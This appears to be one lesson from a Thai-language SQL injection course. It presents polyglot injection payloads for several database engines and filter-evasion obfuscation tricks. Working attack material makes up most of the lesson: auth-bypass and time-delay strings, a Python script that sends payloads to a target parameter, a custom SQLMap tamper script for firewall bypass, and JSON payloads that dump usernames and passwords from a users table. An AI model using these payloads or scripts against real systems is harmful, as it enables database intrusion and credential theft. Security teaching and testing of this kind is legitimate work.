# Part 052: Polyglot Payloads และ Advanced Obfuscation

## ภาพรวม

Polyglot payloads ทำงานได้กับหลาย database engine พร้อมกัน และ advanced obfuscation สำหรับ WAF bypass

**ขั้นตอนที่ 841-860**

---

## 841. Polyglot SQL Injection

```sql
-- Polyglot ที่ทำงานได้กับ MySQL, MSSQL, PostgreSQL

-- Universal comment bypass:
-- /*!50000 ... */ ทำงานใน MySQL (version >=5.0.0)
-- /* ... */ ทำงานทุก DB

-- Universal version check:
-- MySQL: @@version
-- PostgreSQL: version()
-- MSSQL: @@VERSION
-- Oracle: (SELECT banner FROM v$version WHERE rownum=1)

-- Polyglot auth bypass:
' OR '1'='1'/*
-- MySQL: comment ทั้งหมดหลัง /*
-- ทดสอบกับหลาย DB

-- Universal time delay (test all):
' AND (SELECT 1 FROM (SELECT SLEEP(3))x)='1  -- MySQL
'; WAITFOR DELAY '0:0:3'--  -- MSSQL
' AND (SELECT pg_sleep(3))='1  -- PostgreSQL
```

---

## 842. Multi-DB Polyglot Payloads

```python
import requests
import time

POLYGLOT_PAYLOADS = {
    'version': [
        "' UNION SELECT @@version,NULL-- -",         # MySQL/MSSQL
        "' UNION SELECT version(),NULL-- -",          # PostgreSQL
        "' UNION SELECT banner,NULL FROM v$version-- -",  # Oracle
    ],
    
    'current_user': [
        "' UNION SELECT user(),NULL-- -",             # MySQL/MSSQL
        "' UNION SELECT current_user,NULL-- -",       # PostgreSQL
        "' UNION SELECT user,NULL FROM dual-- -",     # Oracle
    ],
    
    'sleep': [
        "' AND SLEEP(3)-- -",                         # MySQL
        "'; WAITFOR DELAY '0:0:3'-- -",              # MSSQL
        "' AND (SELECT pg_sleep(3))='1-- -",          # PostgreSQL
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)-- -",  # Oracle
    ],
}

def test_polyglot(url: str, param: str):
    for category, payloads in POLYGLOT_PAYLOADS.items():
        for payload in payloads:
            try:
                start = time.time()
                r = requests.get(url, params={param: payload}, timeout=10)
                elapsed = time.time() - start
                
                db_indicators = {
                    'mysql': ['mysql', 'mariadb'],
                    'postgresql': ['postgresql', 'postgres'],
                    'mssql': ['microsoft sql server', 'mssql'],
                    'oracle': ['oracle', 'ora-'],
                }
                
                detected = []
                for db, kws in db_indicators.items():
                    if any(k in r.text.lower() for k in kws):
                        detected.append(db)
                
                if detected or elapsed > 2.5:
                    print(f"[+] {category}: {payload[:60]}")
                    print(f"    Time: {elapsed:.2f}s, DB: {detected}")
                    
            except requests.Timeout:
                print(f"[+] TIMEOUT with: {payload[:50]}")
```

---

## 843. Advanced Obfuscation Techniques

```sql
-- Technique 1: Nested comments
SEL/**/ECT  -- MySQL
UN/*comment*/ION  SE/*another*/LECT

-- Technique 2: MySQL version comment
/*!50000 UNION SELECT */  -- executes in MySQL 5.0+

-- Technique 3: Type coercion
1' AND '1'='1         -- string
1' AND 1.0=1.0        -- numeric
1' AND 0x31=0x31      -- hex

-- Technique 4: Subquery obfuscation
' UNION (SELECT 1,2,3)-- -
' UNION (((SELECT 1,2,3)))-- -

-- Technique 5: String from chars
CHAR(85,78,73,79,78)  -- "UNION" from ASCII
CONCAT(CHAR(85),CHAR(78),'ION')  -- mixed

-- Technique 6: Whitespace variants
SELECT%09*%09FROM  -- tab
SELECT%0a*%0aFROM  -- newline
SELECT%0d*%0dFROM  -- carriage return
SELECT%0b*%0bFROM  -- vertical tab

-- Technique 7: Mixed encoding
' UN%49ON SE%4cECT 1,2,3--  -- partial URL encoding
```

---

## 844. SQLMap Tamper Script

```python
#!/usr/bin/env python3
"""
Custom SQLMap tamper script: polyglot_bypass.py
วางไว้ใน tamper/ directory ของ SQLMap
"""
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """Polyglot obfuscation tamper script"""
    if payload:
        # แทนที่ spaces ด้วย version comments
        result = payload.replace(' ', '/**/')
        
        # แทนที่ keyword ด้วย version-commented version
        result = result.replace('UNION', '/*!50000UNION*/')
        result = result.replace('SELECT', '/*!50000SELECT*/')
        
        return result
    return payload

# ทดสอบ
if __name__ == '__main__':
    test = "' UNION SELECT 1,version(),3-- -"
    print(f"Original: {test}")
    print(f"Tampered: {tamper(test)}")
    # Output: ' /*!50000UNION*//**//*!50000SELECT*//**/1,version(),3--/**/-
```

---

## 845. JSON Polyglot

```python
import requests
import json

# JSON value ที่มี SQL injection
json_payloads = [
    {"username": "admin' -- ", "password": "x"},
    {"username": "admin' OR '1'='1", "password": "x"},
    {"id": "1 UNION SELECT 1,username,password FROM users-- -"},
    {"filter": {"name": "test' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -"}},
]

for payload in json_payloads:
    r = requests.post(
        'http://target/api/endpoint',
        data=json.dumps(payload),
        headers={'Content-Type': 'application/json'}
    )
    print(f"Status: {r.status_code}, Response: {r.text[:100]}")
```

---

## สรุป

Polyglot Payloads:
- **Universal syntax** - ทำงานกับหลาย DB
- **Version comments** - MySQL-specific obfuscation
- **Nested comments** - bypass simple keyword filters
- **Char encoding** - CHAR() แทน string literals
- **Whitespace variants** - tab, newline, vertical tab
- **Custom tamper** - SQLMap script สำหรับ automated bypass

---

*Part 052 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
